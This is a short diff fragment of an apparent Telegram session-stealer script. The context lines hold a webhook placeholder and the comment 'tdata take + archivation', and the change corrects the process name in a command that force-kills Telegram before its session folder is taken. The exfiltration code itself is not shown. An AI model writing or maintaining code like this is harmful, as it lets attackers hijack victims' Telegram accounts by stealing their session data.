@@ -27,7 +27,7 @@ hook = "{hook}"
 # sources end
 
 #task_kill
-os.system('taskkill /f /im Telegram Desktop.exe')
+os.system('taskkill /f /im Telegram.exe')
 #task_kill_end
 
 # tdata take + archivation
